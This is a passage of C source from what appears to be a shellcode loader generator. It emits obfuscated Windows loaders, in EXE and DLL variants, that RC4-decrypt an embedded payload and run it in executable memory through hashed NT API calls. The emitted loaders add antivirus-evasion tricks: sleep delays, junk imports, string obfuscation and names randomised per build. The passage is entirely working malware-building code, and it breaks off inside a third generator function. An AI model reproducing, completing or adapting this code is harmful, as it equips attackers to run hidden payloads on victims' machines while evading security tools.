        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char pav[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)p03, sizeof(p03), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(pav), p03);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL %s() {\n"
        "    HANDLE shandle = NULL;\n"
        "    HANDLE thandle = NULL;\n"
        "    PVOID address = NULL;\n"
        "    SIZE_T sViewSize = 0;\n"
        "    LARGE_INTEGER MaximumSize = { .QuadPart = sizeof(%s) };\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE nlt = %s(%s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    %s p%s = (%s)%s(nlt, %s);\n"
        "    p%s(&shandle, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        "    p%s(shandle, (HANDLE)-1, &address, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);\n"
        "    memcpy(address, %s, sizeof(%s));\n"
        "    Ruard(HINT_BYTE, %s, address, sizeof(%s), sizeof(%s));\n"
        "    p%s(&thandle, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, 0, 0, 0, 0, NULL);\n"
        "    p%s(thandle, FALSE, &timeout);\n"
        "    p%s(thandle);\n"
        "    p%s((HANDLE)-1, address);\n"
        "    p%s(shandle);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID run() {\n"
        "    %s(0.5);\n"
        "    %s();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE ,  DWORD  ul_reason_for_call, LPVOID ) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        GetProcAddress_typedef,
        NtCreateSection_typedef,
        NtMapViewOfSection_typedef,
        UnmapViewOfSection_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        NtDelayExecution_typedef,
        random_toUpper_name,
        ntdll_hash_name,
        kernel32_hash_name,
        ntcreatesection_hash_name,
        ntmapviewofsection_hash_name,
        ntunmapviewofsection_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        random_obf_func,
        xkey, obfuscated_fun, random_payload_name, shellcodeArray, random_key_name, keyArray, hint,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_inject_func,
        random_payload_name,
        random_getmodule_name, ntdll_hash_name,
        NtCreateSection_typedef, pNtCreateSection_name, NtCreateSection_typedef, random_getproc_name, ntcreatesection_hash_name,
        NtMapViewOfSection_typedef, pNtMapViewOfSection_name, NtMapViewOfSection_typedef, random_getproc_name, ntmapviewofsection_hash_name,
        UnmapViewOfSection_typedef, pUnmapViewOfSection_name, UnmapViewOfSection_typedef, random_getproc_name, ntunmapviewofsection_hash_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        NtClose_typedef, pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        pNtCreateSection_name,
        pNtMapViewOfSection_name,
        random_payload_name, random_payload_name,
        random_key_name, random_key_name, random_payload_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        pUnmapViewOfSection_name,
        pNtClose_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_delay_func,
        random_inject_func
    );
}
void obf_deley_5_process_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];

    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtAllocateVirtualMemory_name[9], pNtProtectVirtualMemory_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pNtDelayExecution_name[9];

    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtAllocateVirtualMemory_name, sizeof(pNtAllocateVirtualMemory_name));
    generate_random_string(pNtProtectVirtualMemory_name, sizeof(pNtProtectVirtualMemory_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntallocatevirtualmemory_hash_name[11];
    char ntprotectvirtualmemory_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11];

    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntallocatevirtualmemory_hash_name, sizeof(ntallocatevirtualmemory_hash_name));
    generate_random_string(ntprotectvirtualmemory_hash_name, sizeof(ntprotectvirtualmemory_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtAllocateVirtualMemory_typedef[12], NtProtectVirtualMemory_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char NtDelayExecution_typedef[12];

    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtAllocateVirtualMemory_typedef, sizeof(NtAllocateVirtualMemory_typedef));
    generate_random_string(NtProtectVirtualMemory_typedef, sizeof(NtProtectVirtualMemory_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];

    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));

    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* %s)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* %s)(LPCSTR);\n"
        "typedef FARPROC(NTAPI* %s)(HMODULE, LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);\n"
        "typedef NTSTATUS(NTAPI* %s)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID %s() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s               0x5251037A\n"
        "#define %s               0xA5E086A2\n"
        "#define %s           0x0B37D3B9\n"
        "#define %s           0x504D6BF5\n"
        "#define %s           0xCB42C5A9\n"
        "#define %s           0x61D8C71D\n"
        "#define %s           0x1236E2D7\n"
        "#define %s           0xF20D7F2A\n"
        "#define %s           0xA4E3F108\n"
        "#define %s           0xB9D893EC\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pnct[] = {%s};\n"
        "unsigned char %s[] = { %s };\n"
        "unsigned char %s[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL Rua(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kernel = %s(%s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    %s p%s = (%s)%s(kernel, %s);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char dpi[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    %s((char*)pnct, sizeof(pnct), xkey, sizeof(xkey));\n"
        "    %s p%s = (%s)p%s(p%s(dpi), pnct);\n"
        "    p%s(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "VOID %s() {\n"
        "    HANDLE hThread = NULL;\n"
        "    PVOID pAddress = NULL;\n"
        "    DWORD old = 0;\n"
        "    SIZE_T sPayloadSize = sizeof(%s);\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE tll = %s(%s);\n"
        "    %s p%s = (%s)%s(tll, %s);\n"
        "    %s p%s = (%s)%s(tll, %s);\n"
        "    %s p%s = (%s)%s(tll, %s);\n"
        "    %s p%s = (%s)%s(tll, %s);\n"
        "    %s p%s = (%s)%s(tll, %s);\n"
        "    p%s((HANDLE)-1, &pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n"
        "    memcpy(pAddress, %s, sPayloadSize);\n"
        "    Rua(HINT_BYTE, %s, pAddress, sizeof(%s), sPayloadSize);\n"
        "    p%s((HANDLE)-1, &pAddress, &sPayloadSize, PAGE_EXECUTE_READ, &old);\n"
        "    p%s(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, 0, 0, 0, 0, 0);\n"
        "    p%s(hThread, FALSE, &timeout);\n"
        "    p%s(hThread);\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    HMODULE ntdll = %s(%s);\n"
        "    %s p%s = (%s)%s(ntdll, %s);\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE , HINSTANCE , LPSTR , int ) {\n"
        "    %s(0.5);\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        SystemFunction032_typedef,
        LoadLibraryA_typedef,
        GetProcAddress_typedef,
        NtAllocateVirtualMemory_typedef,
        NtProtectVirtualMemory_typedef,
        NtCreateThreadEx_typedef,
        NtWaitForSingleObject_typedef,
        NtClose_typedef,
        NtDelayExecution_typedef,
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_iatcamouflage_name,
        random_helper_name,
        ntdll_hash_name,
        kernel32_hash_name,
        ntallocatevirtualmemory_hash_name,
        ntprotectvirtualmemory_hash_name,
        ntwaitforsingleobject_hash_name,
        ntcreatethreadex_hash_name,
        ntdelayexecution_hash_name,
        ntclose_hash_name,
        loadlibrarya_hash_name,
        getprocaddress_hash_name,
        random_obf_func,
        xkey, obfuscated_fun, random_payload_name, shellcodeArray, random_key_name, keyArray, hint,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_getmodule_name, kernel32_hash_name,
        LoadLibraryA_typedef, pLoadLibraryA_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        GetProcAddress_typedef, pGetProcAddress_name, GetProcAddress_typedef, random_getproc_name, getprocaddress_hash_name,
        random_obf_func,
        SystemFunction032_typedef, pSystemFunction032_name, SystemFunction032_typedef, pGetProcAddress_name, pLoadLibraryA_name,
        pSystemFunction032_name,
        random_inject_func,
        random_payload_name,
        random_getmodule_name, ntdll_hash_name,
        NtAllocateVirtualMemory_typedef, pNtAllocateVirtualMemory_name, NtAllocateVirtualMemory_typedef, random_getproc_name, ntallocatevirtualmemory_hash_name,
        NtProtectVirtualMemory_typedef, pNtProtectVirtualMemory_name, NtProtectVirtualMemory_typedef, random_getproc_name, ntprotectvirtualmemory_hash_name,
        NtCreateThreadEx_typedef, pNtCreateThreadEx_name, NtCreateThreadEx_typedef, random_getproc_name, ntcreatethreadex_hash_name,
        NtWaitForSingleObject_typedef, pNtWaitForSingleObject_name, NtWaitForSingleObject_typedef, random_getproc_name, ntwaitforsingleobject_hash_name,
        NtClose_typedef, pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        pNtAllocateVirtualMemory_name,
        random_payload_name, random_key_name, random_key_name,
        pNtProtectVirtualMemory_name,
        pNtCreateThreadEx_name,
        pNtWaitForSingleObject_name,
        pNtClose_name,
        random_delay_func,
        random_getmodule_name, ntdll_hash_name,
        NtDelayExecution_typedef, pNtDelayExecution_name, NtDelayExecution_typedef, random_getproc_name, ntdelayexecution_hash_name,
        pNtDelayExecution_name,
        random_delay_func,
        random_inject_func
    );
}
void obf_deley_5_process_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];
    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names for APIs
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtAllocateVirtualMemory_name[9], pNtProtectVirtualMemory_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pNtDelayExecution_name[9];
    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtAllocateVirtualMemory_name, sizeof(pNtAllocateVirtualMemory_name));
    generate_random_string(pNtProtectVirtualMemory_name, sizeof(pNtProtectVirtualMemory_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntallocatevirtualmemory_hash_name[11];
    char ntprotectvirtualmemory_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11];
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntallocatevirtualmemory_hash_name, sizeof(ntallocatevirtualmemory_hash_name));
    generate_random_string(ntprotectvirtualmemory_hash_name, sizeof(ntprotectvirtualmemory_hash_name));
    generate_random_string(ntwaitforsingleobject_hash_name, sizeof(ntwaitforsingleobject_hash_name));
    generate_random_string(ntcreatethreadex_hash_name, sizeof(ntcreatethreadex_hash_name));
    generate_random_string(ntdelayexecution_hash_name, sizeof(ntdelayexecution_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(getprocaddress_hash_name, sizeof(getprocaddress_hash_name));

    // Random typedef names
    char SystemFunction032_typedef[12], LoadLibraryA_typedef[12], GetProcAddress_typedef[12];
    char NtAllocateVirtualMemory_typedef[12], NtProtectVirtualMemory_typedef[12];
    char NtCreateThreadEx_typedef[12], NtWaitForSingleObject_typedef[12], NtClose_typedef[12];
    char NtDelayExecution_typedef[12];
    generate_random_string(SystemFunction032_typedef, sizeof(SystemFunction032_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));
    generate_random_string(GetProcAddress_typedef, sizeof(GetProcAddress_typedef));
    generate_random_string(NtAllocateVirtualMemory_typedef, sizeof(NtAllocateVirtualMemory_typedef));
    generate_random_string(NtProtectVirtualMemory_typedef, sizeof(NtProtectVirtualMemory_typedef));
    generate_random_string(NtCreateThreadEx_typedef, sizeof(NtCreateThreadEx_typedef));
    generate_random_string(NtWaitForSingleObject_typedef, sizeof(NtWaitForSingleObject_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(NtDelayExecution_typedef, sizeof(NtDelayExecution_typedef));

    // Random names for EncryptedPayload and ProtectedKey
    char random_payload_name[15], random_key_name[15];
    generate_random_string(random_payload_name, sizeof(random_payload_name));
    generate_random_string(random_key_name, sizeof(random_key_name));

    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
